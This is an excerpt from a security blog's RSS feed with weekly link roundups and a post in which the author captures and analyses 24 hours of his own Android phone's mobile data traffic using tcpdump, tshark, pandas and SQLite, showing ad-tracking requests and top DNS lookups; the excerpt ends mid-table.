    plt.plot(x, t_closed, linestyle=<span style="color:#ed9d13">&#39;--&#39;</span>, color=<span style="color:#ed9d13">&#39;r&#39;</span>, label=<span style="color:#ed9d13">&#39;Open&#39;</span>)
    plt.legend()


    <span style="color:#999;font-style:italic">### Fig 3 ##########################################################</span>
    fig3 = figure(<span style="color:#3677a9">1</span>, figsize=(<span style="color:#3677a9">2000</span>/my_dpi, <span style="color:#3677a9">1800</span>/my_dpi), dpi=my_dpi)
    fig3.add_subplot(<span style="color:#3677a9">223</span>)
    plt.gca().xaxis.set_major_formatter(mdates.DateFormatter(<span style="color:#ed9d13">&#39;%Y-%m&#39;</span>))
    plt.gca().xaxis.set_major_locator(mdates.MonthLocator())

    plt.plot(x, t_wip, linestyle=<span style="color:#ed9d13">&#39;--&#39;</span>, color=<span style="color:#ed9d13">&#39;b&#39;</span>, label=<span style="color:#ed9d13">&#39;Work in progress&#39;</span>)
    plt.plot(x, t_open, linestyle=<span style="color:#ed9d13">&#39;--&#39;</span>, color=<span style="color:#ed9d13">&#39;r&#39;</span>, label=<span style="color:#ed9d13">&#39;Open&#39;</span>)
    plt.fill_between(x,t_wip,<span style="color:#3677a9">0</span>,color=<span style="color:#ed9d13">&#39;orange&#39;</span>)
    <span style="color:#999;font-style:italic">#plt.fill_between(x,t_open,0,color=&#39;black&#39;)</span>
    plt.legend()


    <span style="color:#999;font-style:italic">### Fig 4 #########################################################</span>
    fig4 = figure(<span style="color:#3677a9">1</span>, figsize=(<span style="color:#3677a9">4</span>,<span style="color:#3677a9">4</span>))
    ax = fig4.add_subplot(<span style="color:#3677a9">224</span>)
    <span style="color:#999;font-style:italic">#ax = Subplot(fig4, 224</span>
    <span style="color:#999;font-style:italic">#ax = plt.axes([0.5, 0.5, 0.4, 0.4])</span>
    <span style="color:#999;font-style:italic"># plt.axes([0.5, 0.5, 0.8, 0.8])</span>
    labels = <span style="color:#ed9d13">&#39;Closed&#39;</span>, <span style="color:#ed9d13">&#39;Fixed&#39;</span>, <span style="color:#ed9d13">&#39;Work in Progress&#39;</span>, <span style="color:#ed9d13">&#39;Won</span><span style="color:#ed9d13">\&#39;</span><span style="color:#ed9d13">t Fix&#39;</span>, <span style="color:#ed9d13">&#39;Open&#39;</span>
    colors = (<span style="color:#ed9d13">&#39;orange&#39;</span>, <span style="color:#ed9d13">&#39;green&#39;</span>, <span style="color:#ed9d13">&#39;yellow&#39;</span>, <span style="color:#ed9d13">&#39;black&#39;</span>, <span style="color:#ed9d13">&#39;grey&#39;</span>)
    fracs = np.random.randint(<span style="color:#3677a9">50</span>, size=<span style="color:#24909d">len</span>(labels))
    plt.pie(fracs,labels=labels, colors=colors, autopct=<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">%1.1f%%</span><span style="color:#ed9d13">&#39;</span>, shadow=<span style="color:#6ab825;font-weight:bold">True</span>, startangle=<span style="color:#3677a9">90</span>)
    plt.title(<span style="color:#ed9d13">&#39;Issues overview&#39;</span>)

    plt.show()


gen_dashboard()
</code></pre></div><p>The code just generates 4 time series data and displays them in several plots. A pie chart is also included. I hope somebody will find it useful.</p>
<p>And the result:</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 27</title>
      <link>https://blog.dornea.nu/2014/02/14/links-of-the-week-27/</link>
      <pubDate>Fri, 14 Feb 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/02/14/links-of-the-week-27/</guid>
      <content:encoded><![CDATA[<ul>
<li>
<p><a href="http://www.lauradhamilton.com/random-lessons-online-poker-exploit">When Random Isnâ€™t Random Enough: Lessons from an Online Poker Exploit</a></p>
</li>
<li>
<p><a href="http://blog.cloudflare.com/technical-details-behind-a-400gbps-ntp-amplification-ddos-attack">Technical Details Behind a 400Gbps NTP Amplification DDoS Attack</a></p>
</li>
<li>
<p><a href="http://www.securelist.com/en/analysis/204792325/Absolute_Computrace_Revisited">Absolute Computatrace revisited</a></p>
</li>
<li>
<p><a href="http://blog.secureideas.com/2014/02/announcing-burp-co2.html">Burp Co2</a></p>
</li>
<li>
<p><a href="http://people.linaro.org/~rikuvoipio/aarch64-talk/#/">Porting Applications to 64bit ARM</a></p>
</li>
<li>
<p><a href="http://sectoolmarket.com/price-and-feature-comparison-of-web-application-scanners-unified-list.html">Price and Feature Comparison of Web Application Scanners</a></p>
</li>
<li>
<p><a href="https://t.co/OCghQE8sLZ">GoLismero 2.0 Beta 3</a></p>
</li>
<li>
<p><a href="http://vulnhub.com/">vulnhub.com</a></p>
</li>
<li>
<p><a href="http://faces.io">faces.io</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 26</title>
      <link>https://blog.dornea.nu/2014/02/07/links-of-the-week-26/</link>
      <pubDate>Fri, 07 Feb 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/02/07/links-of-the-week-26/</guid>
      <content:encoded><![CDATA[<ul>
<li>
<p><a href="http://www.righto.com/2014/02/bitcoins-hard-way-using-raw-bitcoin.html">Bitcoins the hard way: Using the raw Bitcoin protocol</a></p>
</li>
<li>
<p><a href="http://www.lighterra.com/papers/modernmicroprocessors/">Modern Processors â€“ A 90min guide</a></p>
</li>
<li>
<p><a href="http://www.kislaybhardwaj.com/2013/10/the-gsm-security-model.html">The GSM security model</a></p>
</li>
<li>
<p><a href="http://www.tekdefense.com/news/2013/12/23/analyzing-darkcomet-in-memory.html">Analyzing DarkComet inÂ Memory</a></p>
</li>
<li>
<p><a href="http://www.wired.com/wiredscience/2014/02/cryptography-breakthrough/">Cryptography Breakthrough Could Make Software Unhackable</a></p>
</li>
<li>
<p><a href="https://ochronus.com/git-tips-from-the-trenches/">Git tips from the trenches</a></p>
</li>
<li>
<p><a href="http://www.wired.com/threatlevel/2014/01/nsa-surveillance/">I Spent Two Hours Talking With the NSA&rsquo;s Bigwigs. Here&rsquo;s What Has Them Mad</a></p>
</li>
<li>
<p><a href="https://www.quakenet.org/articles/102-press-release-irc-networks-under-systematic-attack-from-governments">PRESS RELEASE: IRC NETWORKS UNDER SYSTEMATIC ATTACK FROM GOVERNMENTS</a></p>
</li>
<li>
<p><a href="https://github.com/nemasu/asmttpd">Web server for Linux written in amd64 assembly</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 25</title>
      <link>https://blog.dornea.nu/2014/01/31/links-of-the-week-25/</link>
      <pubDate>Fri, 31 Jan 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/01/31/links-of-the-week-25/</guid>
      <content:encoded><![CDATA[<ul>
<li>
<p itemprop="headline">
  <a href="http://thenextweb.com/socialmedia/2014/01/29/lost-50000-twitter-username/#!t3U0G">How I lost my $50,000 Twitter username</a>
</p>
</li>
<li>
<p><a href="http://resources.infosecinstitute.com/nsa-bios-backdoor-god-mode-malware-deitybounce/">NSA BIOS Backdoor a.k.a. God Mode Malware Part 1: DEITYBOUNCE</a></p>
</li>
<li>
<p><a href="http://slandail.net/step-by-step-guide-to-decompiling-android-apps/">Step-by-Step Guide To Decompiling Android Apps</a></p>
</li>
<li>
<p><a href="http://untraceableblog.com/">Untraceable Blog</a></p>
</li>
<li>
<p><a href="https://github.com/DanMcInerney/wifijammer">Continuously jam all wifi clients and access points within range</a></p>
</li>
<li>
<p id="stcpDiv">
  <a href="http://www.cloudshield.com/blog/advanced-malware/how-to-decrypt-openssl-sessions-using-wireshark-and-ssl-session-identifiers/">How to Decrypt OpenSSL Sessions using Wireshark and SSL Session Identifiers</a>
</p>
</li>
<li>
<p><a href="http://h4des.org/blog/index.php?/archives/341-eduroam-WiFi-security-audit-or-why-it-is-broken-by-design.html">eduroam WiFi security audit or why it is broken by design</a></p>
</li>
<li>
<p itemprop="headline">
  <a href="http://impossiblehq.com/workstation-popcorn">Workstation Popcorn: How To Become Uber Productive While Working For Yourself</a>
</p>
</li>
<li>
<p><a href="http://arstechnica.com/security/2014/01/java-based-malware-driving-ddos-botnet-infects-windows-mac-linux-devices/">Java-based malware driving DDoS botnet infects Windows, Mac, Linux device</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 24</title>
      <link>https://blog.dornea.nu/2014/01/24/links-of-the-week-24/</link>
      <pubDate>Fri, 24 Jan 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/01/24/links-of-the-week-24/</guid>
      <content:encoded><![CDATA[<ul>
<li>
<p><a href="http://poppopret.org/2013/01/07/suterusu-rootkit-inline-kernel-function-hooking-on-x86-and-arm/">Suterusu Rootkit: Inline Kernel Function Hooking on x86 andÂ ARM</a></p>
</li>
<li>
<p><a href="http://blogs.360.cn/360mobile/2014/01/17/oldboot-the-first-bootkit-on-android/">Oldboot: the first bootkit on Android</a></p>
</li>
<li>
<p><a href="http://www.nytimes.com/2014/01/19/opinion/sunday/for-the-love-of-money.html?_r=0">For the Love of Money</a></p>
</li>
<li>
<p id="ctl00_ArticleTitle" itemprop="name">
  <a href="http://www.codeproject.com/Articles/708129/Automated-penetration-testing-in-the-Microsoft-sta">Automated penetration testing in the Microsoft stack with OWASP ZAP</a>
</p>
</li>
<li>
<p><a title="Permalink to TCP backdoor 32764 or how we could patch the Internet (or part of it ;))" href="http://blog.quarkslab.com/tcp-backdoor-32764-or-how-we-could-patch-the-internet-or-part-of-it.html#null" rel="bookmark">TCP backdoor 32764 or how we could patch the Internet (or part of it ;)) </a></p>
</li>
<li>
<p><a href="http://hackmageddon.com/2014/01/19/2013-cyber-attacks-statistics-summary/">2013 Cyber Attacks StatisticsÂ (Summary)</a></p>
</li>
<li>
<p><a href="http://intelcrawler.com/about/press07">Decebal: Point-of-Sale Malware - 400 lines of VBScript code from Romania, Researchers warns about evolution of threats and interests to modern retailers</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>24h Android sniffing using tcpdump</title>
      <link>https://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump/</link>
      <pubDate>Thu, 23 Jan 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump/</guid>
      <content:encoded><![CDATA[


<blockquote class="notice info">
  For better display results you can also have a look at the <a href="https://github.com/dorneanu/blog/blob/master/content/jupyter/24h-Android-Monitoring.ipynb">24h Android Monitoring Jupyter Notebook</a>.
</blockquote>

<h2 id="motivation">Motivation</h2>
<p>I&rsquo;ve started this little project since I was mainly interested in the data my smartphone isÂ ending all the time without my knowledge. I have a bunch of apps installed on my phone and I have absolutely no ideea which (kind of) data is beeing transfered to the Internet all day long. I thought I&rsquo;d be a great ideea to monitor/sniff my data interface (3G, Edge etc. NOT Wifi) for 24h during my normal daily phone usage.</p>
<p>I have sniffed on a Saturday between 14:00h and 15:00h next day. During this time my phone hasn&rsquo;t been shutdown or put into flight modus.</p>
<blockquote>
<p>Also check out the IPython notebook <a href="/2014/01/23/24h-android-sniffing-using-tcpdump-ipython-notebook-version/">article</a></p>
</blockquote>
<h2 id="changelog">Changelog</h2>
<div class="table-responsive">
<table class="table" border="0">
  <tr align="left">
    <th>
      Date
    </th>
<pre><code>&lt;th&gt;
  Desc
&lt;/th&gt;
</code></pre>
  </tr>
  <tr>
    <td>
      <strong>2014-01-24</strong>
    </td>
<pre><code>&lt;td&gt;
  First release
&lt;/td&gt;
</code></pre>
  </tr>
  <tr>
    <td>
      <strong>2014-01-27</strong>
    </td>
<pre><code>&lt;td&gt;
  Updated `Top 100 Connections`: Note, that the SQL query might be wrong
&lt;/td&gt;
</code></pre>
  </tr>
  <tr>
    <td>
      <strong>2014-02-02</strong>
    </td>
<pre><code>&lt;td&gt;
  Updated `Top 100 Connections`: The SQL query and the table have been updated.
&lt;/td&gt;
</code></pre>
  </tr>
</table>
</div>
<h2 id="sniff-environment">Sniff environment</h2>
<p>I&rsquo;ve used my <strong>Samsung Note 1 (GT N7000)</strong> as sniffing device. At the moment I use a customized ROM (slimbean) with root access. In order to be to use sniffing tools on my phone I had to work in a chrooted environment like <a href="http://sven-ola.dyndns.org/repo/debian-kit-en.html">Debian on Android Kit</a>. This way I was given access to phones data interfaces and I was ready to go.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">u0_a99@android:/ $ deb
e2fsck 1.41.11 (14-Mar-2010)
/storage/sdcard1/debian-kit/debian.img: recovering journal
/storage/sdcard1/debian-kit/debian.img: clean, 55210/170752 files, 426942/512000 blocks
root@debian-on-android:/# ifconfig -a
...
rmnet0 Link encap:Point-to-Point Protocol
POINTOPOINT NOARP MULTICAST MTU:1500 Metric:1
RX packets:37490 errors:0 dropped:0 overruns:0 frame:0
TX packets:30841 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:34233580 (32.6 MiB) TX bytes:5906191 (5.6 MiB)
</code></pre></div><p>Initially I wanted to use tshark for the sniffing part but it didn&rsquo;t work quite well. So I came back to old school tcpdump. Since my data interface was going done all the time I had to make sure that tcpdump was restarted as soon as the data interface was online again. I used the following script:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@debian-on-android:~# cat monitor.sh
<span style="color:#999;font-style:italic">#!/bin/bash</span>

<span style="color:#40ffff">DATE</span>=<span style="color:#ed9d13">`</span>date +<span style="color:#ed9d13">&#34;%Y-%m-%d-%s&#34;</span><span style="color:#ed9d13">`</span>

<span style="color:#6ab825;font-weight:bold">while</span> true;
<span style="color:#6ab825;font-weight:bold">do</span>
tcpdump -i rmnet0 -np -w output-<span style="color:#ed9d13">`</span>date +<span style="color:#ed9d13">&#34;%Y-%m-%d-%s&#34;</span><span style="color:#ed9d13">`</span>.pcap; sleep <span style="color:#3677a9">10</span>
<span style="color:#6ab825;font-weight:bold">done</span>
</code></pre></div><p>I&rsquo;ve fired up my script and after 24 hours I had these outputs:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@debian-on-android:~# ls -l output-2014-01-1*
-rw-r--r--. 1 root root 24907 Jan 18 12:53 output-2014-01-18-1390049466.pcap
-rw-r--r--. 1 root root 2881 Jan 18 12:55 output-2014-01-18-1390049736.pcap
-rw-r--r--. 1 root root 14963016 Jan 18 14:02 output-2014-01-18-1390049777.pcap
-rw-r--r--. 1 root root 54695690 Jan 19 14:03 output-2014-01-18-1390053867.pcap
-rw-r--r--. 1 root root 12492822 Jan 19 16:27 output-2014-01-19-1390140216.pcap
root@debian-on-android:~#
</code></pre></div><h2 id="extract-information-from-pcap-files">Extract information from pcap files</h2>
<p>I did this analysis using <a href="ttp://ipython.org/notebook.html">IPython Notebook</a>. This tool is everything worth mentioning. I was fascinated by the simplicity and the Pythonic way to handle/manipulate data. You should defnitely also have look at <a href="http://pandas.pydata.org/">Pandas</a>. Ok, back to sniffing and First I had to merge the pcap files to one piece:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ mergecap -F libpcap -a output-* -w merged.pcap
</code></pre></div><p>Next step was to extract valuable information from the merged pcap file. I thought following information would be from interest:</p>
<ul>
<li>Which DNS queries have been made?</li>
<li>Connections several hosts: Which ports? Which protocols? etc.</li>
<li>HTTP traffic</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PCAP_FILE = &#34;/home/victor/work/Projects/24h-Android-Monitoring/pcap/merged.pcap&#34;

# Tshark generated files
DNS_QUERIES  = &#34;/home/victor/work/Projects/24h-Android-Monitoring/pcap/dns_queries.csv&#34;
CONNECTIONS  = &#34;/home/victor/work/Projects/24h-Android-Monitoring/pcap/connections.csv&#34;
HTTP_TRAFFIC = &#34;/home/victor/work/Projects/24h-Android-Monitoring/pcap/http_traffic.csv&#34;

# Use tshark to generate some files
dns_queries = !tshark -r $PCAP_FILE  -R &#34;dns.flags.response == 1&#34;  -E occurrence=f -E header=y \
              -T fields  -e frame.number -e frame.time -e dns.qry.name -e dns.resp.addr &gt; $DNS_QUERIES

connections = !tshark -r $PCAP_FILE -E header=y -T fields -e frame.number \
              -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e frame.protocols &gt; $CONNECTIONS

http_traffic = !tshark -r $PCAP_FILE -Y &#34;http.request&#34; -E header=y -T fields \
              -e frame.number -e frame.time -e ip.dst -e http.request.method -e http.request.uri -e http.user_agent \
              -e http.response.code  -e http.response.phrase -e http.content_length -e data -e text &gt; $HTTP_TRAFFIC
</code></pre></div><h1 id="import-data-into-sqlite3-db">Import data into SQLite3 DB</h1>
<p>Now that we have all necessary data, all we have to do is to import it into some RDMS so we can analyze it.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import sqlite3 as sql
con = sql.connect(&#34;:memory:&#34;)
cur = con.cursor()
</code></pre></div><p>In the next step the CSV data would be read into some Pandas DataFrames and then exported to our newly created DB.Â </p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import binascii
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import pandas.io.sql as pdsql

# Pandas settings
pd.set_option(&#39;display.height&#39;, 500)
pd.set_option(&#39;display.max_rows&#39;, 500)
pd.set_option(&#39;display.max_columns&#39;, 500)
pd.set_option(&#39;display.width&#39;, 500)
pd.set_option(&#39;display.max_colwidth&#39;, 1000)

# Useful functions
def hex2str(s):
    if str(s) == &#39;nan&#39;:
        return None
    else:
        return bytes.fromhex(str(s)).decode(&#39;utf-8&#39;)

# Import DNS queries
dns_df = pd.read_table(DNS_QUERIES)
dns_df.columns = [&#39;frame_number&#39;, &#39;frame_time&#39;, &#39;dns_query&#39;, &#39;dns_response&#39;]

# Import connections
con_df = pd.read_table(CONNECTIONS)
con_df.columns = [&#39;frame_number&#39;, &#39;frame_time&#39;, &#39;src&#39;, &#39;dst&#39;, &#39;dstport&#39;, &#39;frame_protocols&#39;]

# Import http traffic
http_df = pd.read_table(HTTP_TRAFFIC)
http_df.columns = [&#39;frame_number&#39;, &#39;frame_time&#39;, &#39;ip_dst&#39;,&#39;request_method&#39;, &#39;request_uri&#39;, &#39;user_agent&#39;,&#39;response_code&#39;, &#39;response_phrase&#39;,&#39;content_length&#39;, &#39;data&#39;, &#39;text&#39;]

# Convert data (hex) to ascii
convert_data = lambda x: hex2str(x)
http_df[&#39;data&#39;] = http_df[&#39;data&#39;].apply(convert_data)


# Write to SQLite
pdsql.write_frame(dns_df, name=&#34;dns&#34;, con=con, if_exists=&#34;delete&#34;)
pdsql.write_frame(con_df, name=&#34;connection&#34;, con=con, if_exists=&#34;delete&#34;)
pdsql.write_frame(http_df, name=&#34;http&#34;, con=con, if_exists=&#34;delete&#34;)
</code></pre></div><p>Now we&rsquo;re ready to do the analysis.</p>
<h2 id="results">Results</h2>
<p>It was a lot of fun doing this kind of analysis. I had <strong>80 MB</strong> of pcap data and <strong>138515</strong>Â framesÂ to be analyzed.Â Â I&rsquo;m aware of the fact that this analysis is far from being complete. Since I wanted to get a rough overview over the connections initiated by my smartphone I think the results below are quite promising. If you have any suggestions for further <code>investigations</code>, feel free to drop a comment below.</p>
<p>As you may notice in the results below Google and Facebook had the most connections, which doesn&rsquo;t really surprise me. Although I don&rsquo;t use Facebook on a regular daily basis the numbers are pretty high.Â </p>
<p>And speaking of Google&hellip; It is also no surprise that a lot of data is collected through ads. A few examples (from section &lsquo;GET Requests&rsquo;):</p>
<div class="table-responsive">
<table class="table" border="0">
  <tr>
    <th style="width: 100px;">
      Host
    </th>
<pre><code>&lt;th&gt;
  GET Request
&lt;/th&gt;
</code></pre>
  </tr>
  <tr>
    <td>
      adx.fe02-sl.manage.com
    </td>
    <td>
      /2/win?_bi=4bq4p7Cn9VXzc3XTEz1wocSUpKU%3D&_ei=10411&_ecost1000000_adx=Utq7uQAM5S8K3tKEAABJJbJHrnHwdXabfQqUjg&-mf=2&-fi=86400&age=0&app=&appi=&appv=&pt=app&pi=<span style="background-color: #00ff00;">com.iudesk.android.photo.editor</span>&p=com.iudesk.android.photo.editor&zid=&pcat=&lat=&lon=&country=DEU&gender=%3F&isp=carrier&netspd=dial-up&model=<span style="background-color: #00ff00;">gt-n7000&os=Android&osv=4.3.1&</span>region=&zip=&dma=0&si=4&_ua=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.3.1%3B+de-de%3B+GT-N7000+Build%2FJLS36I%29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Mobile+Safari%2F534.30+%28Mobile%3B+afma-sdk-a-v6.4.1%29%2Cgzip%28gfe%29&_uh=xid%3ACAESEDLJ4tolP4xNFA9ZOWuBZNM&idx=2&ai=209646&_bid=0.00117&sub5=fe02-sl
    </td>
  </tr>
  <tr>
    <td>
      api.geo.kontagent.net
    </td>
<pre><code>&lt;td&gt;
  /api/v1/0d868f5ce9434bdcafd869f2b11adae8/cpu/?os=android_18&amp;v_maj=4.4.2.254&amp;d=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;GT-N7000&lt;/span&gt;&amp;ts=1390065565&amp;s=218949477293337144&amp;c=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;o2+-+de&amp;kt_v=a1.3.1&amp;m=samsung&lt;/span&gt;
&lt;/td&gt;
</code></pre>
  </tr>
  <tr>
    <td>
      googleads.g.doubleclick.net
    </td>
    <td>
      /mads/gma?preqs=0&session_id=17592708045346502934&u_sd=1.6750001&seq_num=1&u_w=477&msid=com.iudesk.android.photo.editor&js=afma-sdk-a-v6.4.1&ms=nb-L0MAMQe8GvfY_GF6rij7OVhr7yp8iklRfdZEsobLfPN2V1HAwhr3fZaYYsV8OvnBAI7zvDSK59SGWlN8KYfs6k4fUhLp8gwe1zJEHx3aqI1SDtGvoMoDutEe208dqebTP_5d2Ydk4yTNoeVXbACMjJRSOmtoMcMr-P84vo-d1J-36mfPUt4gIueReT9-a1nSfXwrGJ2asIUygSe5Z6OG2q805BRqRtNkbyhnefM7MheC_wWGiqgvdJHjrKa5AZu78GZhAyaseI89idFJ7Qm8Tp4ngsn93gewdu0PP_xJnsQp1DTgrzZMJINW9n2AiZO0CZz5d7vxXMqtPlnNReA&mv=80240021.com.android.vending&bas_off=0&format=320x50_mb&oar=0&net=ed&app_name=2014010100.<span style="background-color: #00ff00;">android.com.iudesk.android.photo.editor</span>&hl=de&gnt=8&u_h=764&carrier=26207&bas_on=0&ptime=0&u_audio=3&imbf=8009&u_so=p&output=html&region=mobile_app&u_tz=60&client_sdk=1&ex=1&slotname=a14ecccef2eb8b3&gsb=4g&caps=inlineVideo_interactiveVideo_mraid1_th_mediation_sdkAdmobApiForAds_di&eid=46621027&jsv=66&urll=935
    </td>
  </tr>
  <tr>
    <td>
      www.youtube-nocookie.com
    </td>
<pre><code>&lt;td&gt;
  device_204?app_anon_id=6988a4be-80bf-4a77-9581-f98c234a176f&amp;firstactive=1389027600&amp;firstactivegeo=DE&amp;firstlogin=1389027600&amp;prevactive=1390003200&amp;prevlogin=1390003200&amp;loginstate=1&amp;cplatform=mobile&amp;c=android&amp;cver=5.3.32&amp;cos=Android&amp;cosver=4.3.1&amp;cbr=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;com.google.android.youtube&amp;cbrver=5.3.32&amp;cbrand=samsung&amp;cmodel=GT-N7000&amp;cnetwork=o2%20-%20de&lt;/span&gt;
&lt;/td&gt;
</code></pre>
  </tr>
</table>
</div>
<h3 id="top-100-dns-queries">Top 100 DNS queries</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p1<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT COUNT(dns_response) AS &#39;# DNS Responses&#39;, dns_query AS &#39;DNS to lookup&#39;
</span><span style="color:#ed9d13">    FROM dns GROUP BY dns_query
</span><span style="color:#ed9d13">    ORDER by 1 DESC
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p1.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">100</span>)<span style="color:#666">
</span></code></pre></div><div class="table-responsive">
<table class="table" border="1">
    <tr>
      <th align="left">
        Pos
      </th>
<pre><code>  &lt;th align=&quot;left&quot;&gt;
    # DNS Responses
  &lt;/th&gt;

  &lt;th align=&quot;left&quot;&gt;
    DNS to lookup
  &lt;/th&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;0
  &lt;/th&gt;

  &lt;td&gt;
    670
  &lt;/td&gt;

  &lt;td&gt;
    graph.facebook.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    1
  &lt;/th&gt;

  &lt;td&gt;
    535
  &lt;/td&gt;

  &lt;td&gt;
    www.google.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    2
  &lt;/th&gt;

  &lt;td&gt;
    435
  &lt;/td&gt;

  &lt;td&gt;
    orcart.facebook.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    3
  &lt;/th&gt;

  &lt;td&gt;
    360
  &lt;/td&gt;

  &lt;td&gt;
    android.googleapis.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    4
  &lt;/th&gt;

  &lt;td&gt;
    340
  &lt;/td&gt;

  &lt;td&gt;
    www.googleapis.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    5
  &lt;/th&gt;

  &lt;td&gt;
    295
  &lt;/td&gt;

  &lt;td&gt;
    fbprod.flipboard.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    6
  &lt;/th&gt;

  &lt;td&gt;
    245
  &lt;/td&gt;

  &lt;td&gt;
    android.clients.google.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    7
  &lt;/th&gt;

  &lt;td&gt;
    190
  &lt;/td&gt;

  &lt;td&gt;
    ad.flipboard.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    8
  &lt;/th&gt;

  &lt;td&gt;
    165
  &lt;/td&gt;

  &lt;td&gt;
    push.parse.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    9
  &lt;/th&gt;

  &lt;td&gt;
    155
  &lt;/td&gt;

  &lt;td&gt;
    play.googleapis.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    10
  &lt;/th&gt;

  &lt;td&gt;
    150
  &lt;/td&gt;

  &lt;td&gt;
    cdn.flipboard.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    11
  &lt;/th&gt;

  &lt;td&gt;
    130
  &lt;/td&gt;

  &lt;td&gt;
    apresolve.spotify.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    12
  &lt;/th&gt;

  &lt;td&gt;
    120
  &lt;/td&gt;

  &lt;td&gt;
    www.google.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    13
  &lt;/th&gt;

  &lt;td&gt;
    115
  &lt;/td&gt;

  &lt;td&gt;
    b-api.facebook.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    14
  &lt;/th&gt;

  &lt;td&gt;
    80
  &lt;/td&gt;

  &lt;td&gt;
    pbs.twimg.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    15
  &lt;/th&gt;

  &lt;td&gt;
    75
  &lt;/td&gt;

  &lt;td&gt;
    ticks2.bugsense.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    16
  &lt;/th&gt;

  &lt;td&gt;
    70
  &lt;/td&gt;

  &lt;td&gt;
    settings.crashlytics.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    17
  &lt;/th&gt;

  &lt;td&gt;
    60
  &lt;/td&gt;

  &lt;td&gt;
    www.theverge.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    18
  &lt;/th&gt;

  &lt;td&gt;
    55
  &lt;/td&gt;

  &lt;td&gt;
    e.apsalar.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    19
  &lt;/th&gt;

  &lt;td&gt;
    55
  &lt;/td&gt;

  &lt;td&gt;
    twitter.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    20
  &lt;/th&gt;

  &lt;td&gt;
    50
  &lt;/td&gt;

  &lt;td&gt;
    i1.ytimg.com
  &lt;/td&gt;
